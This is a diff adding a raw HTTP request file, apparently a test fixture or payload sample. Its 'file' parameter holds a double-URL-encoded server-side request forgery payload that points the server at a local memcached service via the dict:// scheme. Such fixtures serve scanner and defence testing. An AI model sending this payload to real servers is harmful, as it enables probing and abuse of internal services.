@@ -1,0 +1,4 @@
+GET /a?file=dict%253A%252F%252F127.0.0.1%253A11211%252Fstat HTTP/1.1
+Host: demo.example.com
+Connection: close
+
